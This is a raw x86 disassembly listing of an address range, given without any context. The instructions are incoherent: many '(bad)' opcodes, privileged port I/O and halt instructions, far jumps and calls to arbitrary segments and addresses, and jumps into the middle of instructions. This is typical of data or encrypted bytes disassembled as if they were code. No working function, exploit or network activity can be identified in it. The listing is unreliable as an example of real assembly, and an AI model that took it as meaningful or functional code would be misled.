  40bdfb:	ss and ecx,ebp
  40bdfe:	mov    ds:0xdcf24e73,eax
  40be03:	dec    eax
  40be04:	hlt    
  40be05:	mov    ebx,0x357c46d1
  40be0a:	cmp    eax,0xc2efaf1a
  40be0f:	pop    esi
  40be10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be11:	mov    edi,0xd3ff3898
  40be16:	fnstenv [edi+0x76573da5]
  40be1c:	popf   
  40be1d:	mov    WORD PTR [edx*2-0x384eb773],ss
  40be24:	sti    
  40be25:	shl    BYTE PTR [ebx-0x29838f35],1
  40be2b:	mov    ds:0x6d7ae774,eax
  40be30:	daa    
  40be31:	pop    esp
  40be32:	jmp    0x40bdc7
  40be34:	mov    ecx,0x677f1695
  40be39:	or     BYTE PTR [ebx-0x247f50e2],dh
  40be3f:	inc    esp
  40be40:	mov    cl,0x8e
  40be42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be43:	aas    
  40be44:	inc    eax
  40be45:	fucomi st,st(2)
  40be47:	inc    ebx
  40be48:	adc    DWORD PTR [edi+0x3b],ebp
  40be4b:	fist   DWORD PTR [ebp-0x3b41a1a3]
  40be51:	mov    al,ds:0x7e5999b1
  40be56:	mov    bh,0xa2
  40be58:	mov    esp,0x2c6fca8d
  40be5d:	jl     0x40be3b
  40be5f:	mov    ebp,0x62b6434d
  40be64:	fwait
  40be65:	ins    DWORD PTR es:[edi],dx
  40be66:	adc    dl,dh
  40be68:	int3   
  40be69:	lds    eax,FWORD PTR [ebx+0x61]
  40be6c:	adc    al,0x17
  40be6e:	add    al,0xc2
  40be70:	rcr    BYTE PTR [edx],0x8a
  40be73:	push   0x38
  40be75:	push   ebp
  40be76:	cdq    
  40be77:	jb     0x40bed9
  40be79:	and    DWORD PTR [ecx+0x3152ea54],esi
  40be7f:	or     dl,BYTE PTR [edi+0x62]
  40be82:	xchg   edi,eax
  40be83:	ins    BYTE PTR es:[edi],dx
  40be84:	jle    0x40be4b
  40be86:	xchg   DWORD PTR [ecx+0x61ae72d5],edi
  40be8c:	aam    0xd3
  40be8e:	daa    
  40be8f:	and    ebx,edx
  40be91:	popf   
  40be92:	pop    ebp
  40be93:	stos   DWORD PTR es:[edi],eax
  40be94:	nop
  40be95:	cmp    bh,BYTE PTR [esi+0x78b1707c]
  40be9b:	or     al,0x8d
  40be9d:	cld    
  40be9e:	(bad)  
  40be9f:	test   DWORD PTR [eax-0x33],edx
  40bea2:	neg    BYTE PTR [ebx-0x18]
  40bea5:	clc    
  40bea6:	in     eax,dx
  40bea7:	cwde   
  40bea8:	(bad)  
  40bea9:	out    dx,eax
  40beaa:	call   0x823db06a
  40beaf:	lods   eax,DWORD PTR ds:[esi]
  40beb0:	jg     0x40bf29
  40beb2:	mov    dh,0x38
  40beb4:	sti    
  40beb5:	or     ch,BYTE PTR [esi-0x15]
  40beb8:	push   cs
  40beb9:	push   esi
  40beba:	(bad)  
  40bebb:	push   ebp
  40bebc:	ja     0x40bebe
  40bebe:	dec    eax
  40bebf:	sub    BYTE PTR [edx],0xd7
  40bec2:	xchg   DWORD PTR [esi+0x786a230],ecx
  40bec8:	push   eax
  40bec9:	xchg   ecx,eax
  40beca:	push   ebx
  40becb:	fucom  st(6)
  40becd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bece:	bound  ebx,QWORD PTR [edi-0x223fd160]
  40bed4:	and    dh,BYTE PTR [eax+0x2c]
  40bed7:	mov    al,0x81
  40bed9:	pop    ebx
  40beda:	aad    0x91
  40bedc:	xor    DWORD PTR [edx],ecx
  40bede:	in     eax,0x7a
  40bee0:	mov    edi,0x140c7344
  40bee5:	js     0x40beca
  40bee7:	popa   
  40bee8:	adc    eax,0x8b9ad47f
  40beed:	inc    ecx
  40beee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40beef:	add    eax,0x2182b34
  40bef4:	mov    dl,0xe7
  40bef6:	aam    0xdd
  40bef8:	pushf  
  40bef9:	out    dx,eax
  40befa:	pop    ebx
  40befb:	rcl    al,cl
  40befd:	sub    al,0xa7
  40beff:	or     BYTE PTR ds:0x860418e0,ah
  40bf05:	call   0x9892:0xf7ac700d
  40bf0c:	xchg   edx,eax
  40bf0d:	push   ebx
  40bf0e:	dec    edi
  40bf0f:	push   edx
  40bf10:	retf   0x4b68
  40bf13:	adc    DWORD PTR [esi],edi
  40bf15:	test   eax,0x51f06989
  40bf1a:	push   esp
  40bf1b:	test   ebx,0x3fd04576
  40bf21:	mov    ebp,0xcc39c654
  40bf26:	lahf   
  40bf27:	pop    es
  40bf28:	retf   0x64b5
  40bf2b:	punpckhbw mm7,QWORD PTR [ebp-0x73412087]
  40bf32:	and    cl,BYTE PTR [eax]
  40bf34:	cdq    
  40bf35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf36:	aam    0x2a
  40bf38:	push   ebp
  40bf39:	imul   edi,DWORD PTR [eax],0x4f114923
  40bf3f:	and    DWORD PTR [esi+ebp*4],ebx
  40bf42:	push   eax
  40bf43:	dec    edx
  40bf44:	sub    al,0x2a
  40bf46:	pop    es
  40bf47:	test   DWORD PTR [edi*1+0x1629d57f],0x3fdbb21d
  40bf52:	das    
  40bf53:	adc    al,0x81
  40bf55:	dec    edi
  40bf56:	mov    BYTE PTR [edx],al
  40bf58:	cmp    ah,ch
  40bf5a:	(bad)  
  40bf5b:	std    
  40bf5c:	das    
  40bf5d:	into   
  40bf5e:	fnsave [edx]
  40bf60:	rcl    cl,0x1f
  40bf63:	push   edi
  40bf64:	xor    DWORD PTR [ebp-0x38523249],0x96b5d074
  40bf6e:	ret    
  40bf6f:	hlt    
  40bf70:	hlt    
  40bf71:	jbe    0x40bfd1
  40bf73:	pop    esi
  40bf74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf75:	call   0x47c3e1a0
  40bf7a:	fwait
  40bf7b:	add    DWORD PTR [edi+eax*8],0xf5f13521
  40bf82:	aas    
  40bf83:	dec    edi
  40bf84:	xor    eax,0xcf170683
  40bf89:	mov    esp,0xf2043107
  40bf8e:	jmp    0x40bf6c
  40bf90:	mov    bh,0xec
  40bf92:	jno    0x40c012
  40bf94:	lahf   
  40bf95:	cs push 0x11e2217b
  40bf9b:	jnp    0x40bfb0
  40bf9d:	cmp    eax,0xd9392fd9
  40bfa2:	inc    esi
  40bfa3:	(bad)  
  40bfa5:	int    0xd0
  40bfa7:	enter  0x60ee,0x5
  40bfab:	inc    edx
  40bfac:	add    bl,dl
  40bfae:	jmp    0x40bfaa
  40bfb0:	fistp  QWORD PTR [eax+eiz*4+0x11]
  40bfb4:	xor    al,BYTE PTR [eax]
  40bfb6:	ss dec esp
  40bfb8:	in     eax,dx
  40bfb9:	dec    esi
  40bfba:	add    eax,0x79581923
  40bfbf:	and    bl,cl
  40bfc1:	sbb    ah,0x15
  40bfc4:	fnstcw WORD PTR [edx-0x4a]
  40bfc7:	fcmove st,st(7)
  40bfc9:	inc    esp
  40bfca:	cli    
  40bfcb:	in     al,0x9
  40bfcd:	call   0x44cead7e
  40bfd2:	(bad)  
  40bfd3:	fadd   QWORD PTR [edi]
  40bfd5:	inc    esi
  40bfd6:	inc    esi
  40bfd7:	xchg   edx,eax
  40bfd8:	push   0xffffffaf
  40bfda:	push   0x8461ce84
  40bfdf:	or     esi,edi
  40bfe1:	or     eax,0x50e0fe45
  40bfe6:	fcomi  st,st(7)
  40bfe8:	dec    esi
  40bfe9:	pop    ebx
  40bfea:	xor    al,0x25
  40bfec:	jmp    0xdc73c51
  40bff1:	ins    DWORD PTR es:[edi],dx
  40bff2:	inc    ecx
  40bff3:	push   0xfffffffa
  40bff5:	das    
  40bff6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bff7:	test   eax,0x37aaad6d
  40bffc:	jmp    0x2d17aec9
  40c001:	leave  
  40c002:	pop    edx
  40c003:	daa    
  40c004:	clc    
  40c005:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c006:	imul   esi,eax,0xc92e058f
  40c00c:	fdivr  DWORD PTR [ecx]
  40c00e:	arpl   bp,di
  40c010:	push   ds
  40c011:	mov    WORD PTR [esi],ss
  40c013:	inc    eax
  40c014:	cli    
  40c015:	jmp    0xb01f276c
  40c01a:	ja     0x40c069
  40c01c:	loop   0x40bffe
  40c01e:	xchg   esi,eax
  40c01f:	push   ebx
  40c020:	(bad)  
  40c021:	jae    0x40c01d
  40c023:	sti    
  40c024:	leave  
  40c025:	mov    dh,0xee
  40c027:	lock push eax
  40c029:	push   ecx
  40c02a:	mov    dl,0x8a
  40c02c:	(bad)  
  40c02d:	add    bh,al
  40c02f:	jmp    0xc973:0x35c513b7
  40c036:	push   edi
  40c037:	leave  
  40c038:	pop    ds
  40c039:	dec    eax
  40c03a:	xchg   ebx,eax
  40c03b:	adc    DWORD PTR [edi-0x5421de0a],ecx
  40c041:	sbb    eax,0x9a644350
  40c046:	jbe    0x40bfe6
  40c048:	(bad)
  40c04d:	fldenv [ecx+eax*4]
  40c050:	pop    ecx
  40c051:	(bad)  
  40c052:	test   al,0x9f
  40c054:	lds    eax,FWORD PTR [edi]
  40c056:	mov    edx,DWORD PTR [esp+ecx*8-0x23]
  40c05a:	adc    esi,DWORD PTR [ebp-0x11]
  40c05d:	call   DWORD PTR [ecx]
  40c05f:	xor    eax,0xe4a1147e
  40c064:	push   es
  40c065:	or     DWORD PTR [ebp+ebp*4+0xd],0xfffffff2
  40c06a:	or     bl,dh
  40c06c:	das    
  40c06d:	ja     0x40c023
  40c06f:	and    al,BYTE PTR [edi]
  40c071:	into   
  40c072:	xchg   esi,eax
  40c073:	mov    DWORD PTR [ebp+0x74],ebp
  40c076:	xchg   edx,eax
  40c077:	or     esi,eax
  40c079:	mov    cl,dh
  40c07b:	shr    DWORD PTR ds:0xf3503da1,1
  40c081:	das    
  40c082:	hlt    
  40c083:	push   eax
  40c084:	rol    DWORD PTR [esp-0x20bd2b47],1
  40c08b:	sahf   
  40c08c:	mov    edi,0x880d5564
  40c091:	lods   eax,DWORD PTR ds:[esi]
  40c092:	outs   dx,DWORD PTR ds:[esi]
  40c093:	pop    ebx
  40c094:	xor    eax,0x9ec10427
  40c099:	pop    ds
  40c09a:	rol    esp,0x8a
  40c09d:	rol    DWORD PTR [ebp+0x34],cl
  40c0a0:	mov    ds,WORD PTR [edi-0x2c4d7ea4]
  40c0a6:	dec    esi
  40c0a7:	xchg   edx,eax
  40c0a8:	inc    ecx
  40c0a9:	int    0x3c
  40c0ab:	in     eax,0xe4
  40c0ad:	in     eax,0xad
  40c0af:	jge    0x40c0b8
  40c0b1:	in     eax,dx
  40c0b2:	ds xor al,0xfe
  40c0b5:	cmp    DWORD PTR [ebx+0x3c],eax
  40c0b8:	add    BYTE PTR [ecx+0x7d380cbb],bh
  40c0be:	push   ds
  40c0bf:	xchg   esi,eax
  40c0c0:	pusha  
  40c0c1:	pop    ebx
  40c0c2:	cdq    
  40c0c3:	inc    esp
  40c0c4:	bound  edi,QWORD PTR [ecx]
  40c0c6:	ds jp  0x40c0a0
  40c0c9:	fsub   DWORD PTR [ebx-0x34c81b23]
  40c0cf:	mov    cl,0x39
  40c0d1:	inc    esi
  40c0d2:	cmp    ebp,DWORD PTR [eax+0x9022898]
  40c0d8:	mov    ebp,0xa1accd01
  40c0dd:	fiadd  WORD PTR [ebx-0x5f]
  40c0e0:	jno    0x40c161
  40c0e2:	xor    edi,DWORD PTR [ecx]
  40c0e4:	std    
  40c0e5:	cmp    esp,DWORD PTR [eax]
  40c0e7:	xor    ebx,0x8ca2c293
  40c0ed:	gs cmc 
  40c0ef:	cmp    BYTE PTR [esi-0x38d42f80],0x31
  40c0f6:	mov    ah,0x15
  40c0f8:	ror    bh,0x38
  40c0fb:	jg     0x40c0d5
  40c0fd:	repnz xchg esp,eax
  40c0ff:	fadd   QWORD PTR [ebx-0x2ea59258]
  40c105:	mov    ah,0x16
  40c107:	sub    DWORD PTR [edi+ecx*4+0x7b],ecx
  40c10b:	popf   
  40c10c:	add    al,0x74
  40c10e:	or     al,0x10
  40c110:	or     DWORD PTR [esi-0x75b4fe68],ebp
  40c116:	mov    ebx,0x90dfea1f
  40c11b:	das    
  40c11c:	add    al,0xe9
  40c11e:	js     0x40c0f1
  40c120:	xchg   ebp,eax
  40c121:	call   0x6160c820
  40c126:	add    DWORD PTR [ebx],ebp
  40c128:	and    eax,0xb3106ead
  40c12d:	jmp    0x40c0bd
  40c12f:	outs   dx,BYTE PTR ds:[esi]
  40c130:	mov    ds:0xb8bc8a7c,al
  40c135:	or     esi,DWORD PTR [edi+ebp*1]
  40c138:	(bad)  
  40c139:	and    al,0x6
  40c13b:	add    al,0xe6
  40c13d:	pop    esp
  40c13e:	mov    edi,0x5c4a8dd4
  40c143:	inc    edi
  40c144:	pusha  
  40c145:	adc    edi,0xffffff87
  40c148:	jmp    0x40c135
  40c14a:	push   0x408bfbe7
  40c14f:	cdq    
  40c150:	mov    ebp,0x2da5ad6c
  40c155:	push   edx
  40c156:	enter  0x5990,0xe9
  40c15a:	aaa    
  40c15b:	ret    
  40c15c:	inc    edi
  40c15d:	rol    BYTE PTR [edx+0x55],0x71
  40c161:	xchg   ah,dh
  40c163:	push   ds
  40c164:	jge    0x40c14c
  40c166:	inc    ebx
  40c167:	scas   eax,DWORD PTR es:[edi]
  40c168:	sbb    eax,0x7d582c6b
  40c16d:	pop    ebp
  40c16e:	pop    eax
  40c16f:	sub    eax,0x49013a10
  40c174:	mov    ebp,0x34dc35c7
  40c179:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c17a:	inc    esi
  40c17b:	ins    DWORD PTR es:[edi],dx
  40c17c:	cdq    
  40c17d:	sub    BYTE PTR [ebx+0x201fcbf2],bl
  40c183:	adc    dh,bl
  40c185:	leave  
  40c186:	jmp    0x40c1ee
  40c188:	adc    BYTE PTR [ebp+0x5],bh
  40c18b:	fs push ebp
  40c18d:	ss fucompp 
  40c190:	leave  
  40c191:	adc    al,0xb8
  40c193:	dec    ecx
  40c194:	idiv   BYTE PTR [ebp+esi*8-0x42f4591]
  40c19b:	push   edi
  40c19c:	lods   eax,DWORD PTR ds:[esi]
  40c19d:	and    eax,DWORD PTR [ebx+0x7487edc]
  40c1a3:	xor    bl,BYTE PTR [eax+0x49]
  40c1a6:	popf   
  40c1a7:	dec    BYTE PTR [edi-0x146fe74]
  40c1ad:	mov    al,0x17
  40c1af:	out    dx,eax
  40c1b0:	lea    esp,[edi]
  40c1b2:	(bad)  
  40c1b3:	fst    DWORD PTR [edx+0x679b456a]
  40c1b9:	or     edx,DWORD PTR [eax]
  40c1bb:	fisttp WORD PTR [eax]
  40c1bd:	imul   esi,DWORD PTR [ebx-0x4da8b5ed],0x57
  40c1c4:	jmp    0x3146:0x510ac835
  40c1cb:	push   0xf1ff6cb7
  40c1d0:	mov    ?,WORD PTR [edi+0x1c]
  40c1d3:	xchg   edx,eax
  40c1d4:	out    dx,eax
  40c1d5:	repz cmp cl,bh
  40c1d8:	in     eax,dx
  40c1d9:	(bad)  
  40c1da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1db:	xchg   esp,eax
  40c1dc:	push   esi
  40c1dd:	out    dx,eax
  40c1de:	pushf  
  40c1df:	adc    eax,0x7f60d611
  40c1e4:	adc    DWORD PTR [edx],ecx
  40c1e6:	or     eax,0xa4adb349
  40c1eb:	cdq    
  40c1ec:	cdq    
  40c1ed:	int    0x52
  40c1ef:	mov    dh,0x6d
  40c1f1:	jmp    0x5198:0x60862a73
  40c1f8:	jge    0x40c180
  40c1fa:	out    dx,al
  40c1fb:	pop    edi
  40c1fc:	mov    cl,BYTE PTR [ecx+0xe]
  40c1ff:	pop    edi
  40c200:	fdiv   QWORD PTR [esi+0x3c218b3d]
  40c206:	cdq    
  40c207:	add    edi,DWORD PTR [esi-0x42b94544]
  40c20d:	inc    ebx
  40c20e:	pusha  
  40c20f:	dec    ebp
  40c210:	ret    0x70a
  40c213:	daa    
  40c214:	mov    ds:0xa63b66,al
  40c219:	out    dx,al
  40c21a:	ins    DWORD PTR es:[edi],dx
  40c21b:	leave  
  40c21c:	jmp    FWORD PTR [edx+0x3a3f0dd2]
  40c222:	test   ebx,edi
  40c224:	ins    BYTE PTR es:[edi],dx
  40c225:	sahf   
  40c226:	push   eax
  40c227:	cmp    ecx,eax
  40c229:	xchg   esi,eax
  40c22a:	ins    DWORD PTR es:[edi],dx
  40c22b:	xor    bh,BYTE PTR [ebp+0xcf561dc]
  40c231:	and    esp,edx
  40c233:	add    BYTE PTR [edx+0x1f4f3d9b],bl
  40c239:	loope  0x40c289
  40c23b:	mov    al,0xf2
  40c23d:	idiv   BYTE PTR ds:0x31fe009e
  40c243:	popa   
  40c244:	fcom   st(1)
  40c246:	loopne 0x40c289
  40c248:	stos   BYTE PTR es:[edi],al
  40c249:	daa    
  40c24a:	hlt    
  40c24b:	push   ebp
  40c24c:	mov    eax,ds:0x25cfd8b4
  40c251:	imul   ebx,ebp,0xffffffce
  40c254:	cwde   
  40c255:	xchg   ecx,eax
  40c256:	fnsave [ecx-0x40667b03]
  40c25c:	mov    dl,0x76
  40c25e:	into   
  40c25f:	iret   
  40c260:	pop    ds
  40c261:	mov    ecx,0x36197c
  40c266:	ss push ebx
  40c268:	sub    al,BYTE PTR cs:[esi+eiz*1]
  40c26c:	and    al,0x9
  40c26e:	arpl   WORD PTR [edi-0x67d3861a],cx
  40c274:	xchg   DWORD PTR [ecx-0x2e94b573],ebx
  40c27a:	pop    edx
  40c27b:	pop    esp
  40c27c:	inc    ebx
  40c27d:	mov    edx,0x15e340d4
  40c282:	ds adc eax,0x34e2f34a
  40c288:	shl    eax,cl
  40c28a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c28b:	pusha  
  40c28c:	cmp    bl,dh
  40c28e:	cwde   
  40c28f:	inc    ecx
  40c290:	outs   dx,BYTE PTR ds:[esi]
  40c291:	dec    ebx
  40c292:	in     eax,dx
  40c293:	push   edi
  40c294:	or     BYTE PTR [ebp+0xc7a7e55],0xb3
  40c29b:	xor    cl,dl
  40c29d:	jns    0x40c2b7
  40c29f:	ja     0x40c30f
  40c2a1:	pop    ecx
  40c2a2:	call   0x8e772eab
  40c2a7:	outs   dx,DWORD PTR ds:[esi]
  40c2a8:	aas    
  40c2a9:	ret    0xe0d9
  40c2ac:	add    bl,BYTE PTR [esi-0x2eb05618]
  40c2b2:	pop    esi
  40c2b3:	cli    
  40c2b4:	adc    al,0x95
  40c2b6:	mov    di,0xaeb1
  40c2ba:	or     BYTE PTR [ecx-0x68d477b8],bl
  40c2c0:	xchg   BYTE PTR [ecx],al
  40c2c2:	push   esi
  40c2c3:	mov    edx,0xa407916
  40c2c8:	cmp    eax,0xa66f7fe0
  40c2cd:	lock jns 0x40c349
  40c2d0:	in     eax,0xb1
  40c2d2:	repnz push ebp
  40c2d4:	loopne 0x40c294
  40c2d6:	loop   0x40c291
  40c2d8:	into   
  40c2d9:	cmp    BYTE PTR [ebx+0x11],bh
  40c2dc:	mov    WORD PTR ds:0x574443ab,ds
  40c2e2:	jmp    0x14d4690b
  40c2e7:	lock fsubrp st(5),st
  40c2ea:	and    al,0x57
  40c2ec:	aad    0xef
  40c2ee:	adc    al,BYTE PTR [ebx-0x65]
  40c2f1:	jo     0x40c283
  40c2f3:	pop    edi
  40c2f4:	mov    ecx,0xae306b99
  40c2f9:	lods   al,BYTE PTR ds:[esi]
  40c2fa:	in     al,dx
  40c2fb:	push   ebx
  40c2fc:	add    ebx,DWORD PTR [ebx+0x55]
  40c2ff:	sbb    dh,ah
  40c301:	sub    DWORD PTR [esi-0xefd5037],edi
  40c307:	call   0xea20:0x75bd2e8e
  40c30e:	xor    esp,ebp
  40c310:	cld    
  40c311:	das    
  40c312:	ret    
  40c313:	cmc    
  40c314:	and    al,0x2d
  40c316:	ror    BYTE PTR [edx+0x15],0x74
  40c31a:	lds    ecx,FWORD PTR [eax]
  40c31c:	(bad)  [esi-0x1c]
  40c31f:	sub    ch,BYTE PTR [edi]
  40c321:	in     eax,0x3a
  40c323:	push   ss
  40c324:	xchg   ebp,eax
  40c325:	lea    ebp,[edx]
  40c327:	and    edi,eax
  40c329:	jecxz  0x40c337
  40c32b:	stos   DWORD PTR es:[edi],eax
  40c32c:	inc    edx
  40c32d:	test   DWORD PTR [edi],0xb3fdfb67
  40c333:	jmp    0x40c398
  40c335:	xor    ah,BYTE PTR [esi+0x19]
  40c338:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c339:	sti    
  40c33a:	pop    ds
  40c33b:	jle    0x40c3ad
  40c33d:	lock std 
  40c33f:	or     BYTE PTR [edx-0x10],bl
  40c342:	fistp  WORD PTR [edx+edx*1]
  40c345:	inc    ecx
  40c346:	test   DWORD PTR [ebx+edi*4+0x1e248284],0xe207b1c6
  40c351:	or     al,0xcb
  40c353:	popf   
  40c354:	pop    ebp
  40c355:	adc    bl,bl
  40c357:	or     eax,0xf0b0da40
  40c35c:	adc    al,0xc5
  40c35e:	mov    BYTE PTR [edx+0x42],ah
  40c361:	popf   
  40c362:	imul   esi,DWORD PTR [esp+eiz*4-0x2683d9ad],0x73
  40c36a:	ins    BYTE PTR es:[edi],dx
  40c36b:	iret   
  40c36c:	or     BYTE PTR [esi],bl
  40c36e:	xor    dl,bh
  40c370:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40c372:	not    DWORD PTR [edx+ebx*2+0x3a]
  40c376:	push   esp
  40c377:	pop    ds
  40c378:	(bad)  
  40c379:	(bad)  
  40c37a:	scas   eax,DWORD PTR es:[edi]
  40c37b:	fcomp  DWORD PTR [edi+0x11]
  40c37e:	push   ebx
  40c37f:	xor    DWORD PTR [ecx+0x16],0x4d58cde2
  40c386:	add    DWORD PTR [ebx-0x745c37a6],0xffffffcb
  40c38d:	xor    ch,BYTE PTR [ecx+0x21]
  40c390:	add    cl,BYTE PTR [esi-0x3a]
  40c393:	gs ins BYTE PTR es:[edi],dx
  40c395:	stos   DWORD PTR es:[edi],eax
  40c396:	xor    DWORD PTR [eax+edi*4-0x1e943583],esp
  40c39d:	or     edi,DWORD PTR [ebx+edi*4]
  40c3a0:	and    al,bh
  40c3a2:	jae    0x40c379
  40c3a4:	add    ecx,DWORD PTR [ecx-0x4c7a5657]
  40c3aa:	xchg   edx,eax
  40c3ab:	add    BYTE PTR gs:[ebp+esi*8+0x44],0xa0
  40c3b1:	ret    
  40c3b2:	dec    edi
  40c3b3:	js     0x40c376
  40c3b5:	hlt    
  40c3b6:	sbb    eax,0x7a906cde
  40c3bb:	xor    cl,BYTE PTR es:[ecx+0x4d]
  40c3bf:	jb     0x40c38a
  40c3c1:	and    BYTE PTR [ebp+eax*2+0x7400e75b],bl
  40c3c8:	(bad)
  40c3cb:	push   0xb78dfda1
  40c3d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3d1:	fstp   QWORD PTR ds:0xd31d7331
  40c3d7:	jno    0x40c3a6
  40c3d9:	xchg   esp,eax
  40c3da:	clc    
  40c3db:	pusha  
  40c3dc:	jge    0x40c444
  40c3de:	xor    edx,DWORD PTR ds:0x824e697a
  40c3e4:	push   0xffffffcf
  40c3e6:	push   ecx
  40c3e7:	jmp    0x40c43e
  40c3e9:	cmp    bl,BYTE PTR [edx]
  40c3eb:	fdivr  st(0),st
  40c3ed:	das    
  40c3ee:	ret    
  40c3ef:	popf   
  40c3f0:	lods   al,BYTE PTR ds:[esi]
  40c3f1:	imul   edi,esi,0xffffff8a
  40c3f4:	inc    ebp
  40c3f5:	jl     0x40c3c5
  40c3f7:	xlat   BYTE PTR ds:[ebx]
  40c3f8:	mov    ecx,0xd4ecd3c0
  40c3fd:	imul   esp,DWORD PTR [esi],0x5d
  40c400:	out    dx,al
  40c401:	or     ebx,DWORD PTR [esi]
  40c403:	sub    ebp,DWORD PTR [ebp+0x26]
  40c406:	jne    0x40c465
  40c408:	cwde   
  40c409:	push   ecx
  40c40a:	test   DWORD PTR [esi+0x52],0x98b502aa
  40c411:	cs cwde 
  40c413:	fsub   QWORD PTR [ecx-0x2f]
  40c416:	jns    0x40c3dc
  40c418:	dec    edx
  40c419:	xor    al,0xd7
  40c41b:	fst    DWORD PTR ds:0x57c35e4d
  40c421:	add    al,0x5f
  40c424:	or     edx,DWORD PTR [edx+eiz*2]
  40c427:	imul   ebp,ebx,0x1dc85b60
  40c42d:	mov    eax,ds:0xd4f6c0b0
  40c432:	xchg   esp,eax
  40c433:	mov    edx,0x1c20bfc5
  40c438:	das    
  40c439:	cmp    DWORD PTR [ebx+0x50],ebp
  40c43c:	cmc    
  40c43d:	mov    ch,0xd6
  40c43f:	push   edi
  40c440:	add    DWORD PTR [ecx],edx
  40c442:	add    edi,ebx
  40c444:	or     BYTE PTR ds:0xa570bcf8,ah
  40c44a:	push   ebx
  40c44b:	mov    WORD PTR [edx],gs
  40c44d:	sub    al,0x74
  40c44f:	mov    bh,0x5f
  40c451:	ret    
  40c452:	mov    al,ds:0x5636d10e
  40c457:	ja     0x40c490
  40c459:	sahf   
  40c45a:	fwait
  40c45b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c45c:	and    ecx,edx
  40c45e:	adc    ebp,DWORD PTR [edx-0x68]
  40c461:	inc    edi
  40c462:	(bad)  
  40c463:	xor    al,BYTE PTR [esi]
  40c465:	xchg   ecx,eax
  40c466:	cmp    eax,0x25a06e0e
  40c46b:	push   ecx
  40c46c:	pop    edi
  40c46d:	loop   0x40c4ab
  40c46f:	(bad)  
  40c470:	in     eax,dx
  40c471:	into   
  40c472:	shr    bh,0x7e
  40c475:	in     al,0x55
  40c477:	push   esp
  40c478:	xchg   edi,eax
  40c479:	retf   0xfe
  40c47c:	les    edi,FWORD PTR [ecx+0x5a]
  40c47f:	xchg   ebx,eax
  40c480:	daa    
  40c481:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c482:	loop   0x40c4bd
  40c484:	test   eax,0x8d4b65c3
  40c489:	jo     0x40c446
  40c48b:	das    
  40c48c:	inc    esp
  40c48d:	sub    eax,0xfa54b31e
  40c492:	and    eax,0x1a4ca053
  40c497:	fild   QWORD PTR [edx+0x73d1d97b]
  40c49d:	mov    dl,0xeb
  40c49f:	fcom   DWORD PTR [esi-0x5bcaa23c]
  40c4a5:	outs   dx,DWORD PTR ds:[esi]
  40c4a6:	ja     0x40c4fc
  40c4a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4a9:	push   es
  40c4aa:	call   0x4029:0xab956602
  40c4b1:	jle    0x40c4b7
  40c4b3:	hlt    
  40c4b4:	mov    ds:0x7677869c,eax
  40c4b9:	pop    es
  40c4ba:	jb     0x40c4b5
  40c4bc:	inc    ebx
  40c4bd:	loopne 0x40c501
  40c4bf:	(bad)  
  40c4c0:	nop
  40c4c1:	mov    eax,ds:0x808c73a2
  40c4c6:	je     0x40c4cb
  40c4c8:	push   0x7950fcd2
  40c4cd:	adc    BYTE PTR [ebp-0x71b6c775],bh
  40c4d3:	and    BYTE PTR [ecx+edi*1+0x48],bh
  40c4d7:	dec    eax
  40c4d8:	(bad)  
  40c4d9:	push   ecx
  40c4da:	das    
  40c4db:	mov    edx,0xf2244c8c
  40c4e0:	or     DWORD PTR [ebx+0x2a],0x155b2d74
  40c4e7:	mov    esi,0x1b17d1e7
  40c4ec:	dec    ecx
  40c4ed:	or     eax,0x283fcb39
  40c4f2:	sahf   
  40c4f3:	dec    esi
  40c4f4:	out    0x21,al
  40c4f6:	mov    al,ds:0x1cb90a7a
  40c4fb:	push   0x398c38da
  40c500:	cmp    BYTE PTR [ebx+0x7],ah
  40c503:	std    
  40c504:	mov    edx,0x585e3e95
  40c509:	and    ecx,eax
  40c50b:	mov    ecx,0x5e895818
  40c510:	inc    eax
  40c511:	inc    ebx
  40c512:	repnz sub eax,0x6b128782
  40c518:	popf   
  40c519:	cli    
  40c51a:	call   0x8b00:0x75f5cb94
  40c521:	dec    esp
  40c522:	cmp    ecx,DWORD PTR [esi]
  40c524:	ins    DWORD PTR es:[edi],dx
  40c525:	cli    
  40c526:	inc    ebx
  40c527:	in     al,0x8
  40c529:	push   ss
  40c52a:	arpl   WORD PTR [esi-0x60],bx
  40c52d:	leave  
  40c52e:	in     al,0xf0
  40c530:	jb     0x40c52a
  40c532:	add    BYTE PTR [ecx+0x54],al
  40c535:	sbb    cl,BYTE PTR [edi]
  40c537:	pop    esp
  40c538:	push   es
  40c539:	arpl   dx,cx
  40c53b:	jmp    0x5230c988
  40c540:	mov    dh,0x77
  40c542:	xchg   ecx,eax
  40c543:	or     ah,BYTE PTR [ecx]
  40c545:	mov    dl,0x4b
  40c547:	jnp    0x40c4de
  40c549:	lahf   
  40c54a:	and    eax,0xf6e34390
  40c54f:	out    0xd5,al
  40c551:	dec    edx
  40c552:	mov    ebp,DWORD PTR ss:[esp+eiz*2-0x768740d1]
  40c55a:	icebp  
  40c55b:	push   cs
  40c55c:	jo     0x40c5cd
  40c55e:	sbb    ah,BYTE PTR [edi-0x72543ede]
  40c564:	jp     0x40c54e
  40c566:	mov    edi,0x1b6a7d33
  40c56b:	adc    al,BYTE PTR ds:0xbebe9481
  40c571:	lock add ebx,ecx
  40c574:	pop    ecx
  40c575:	shl    bh,cl
  40c577:	jo     0x40c530
  40c579:	cmp    al,0xfe
  40c57b:	ins    DWORD PTR es:[edi],dx
  40c57c:	jecxz  0x40c511
  40c57e:	add    al,0x57
  40c580:	dec    esp
  40c581:	data16 das 
  40c583:	ins    DWORD PTR es:[edi],dx
  40c584:	adc    al,0x73
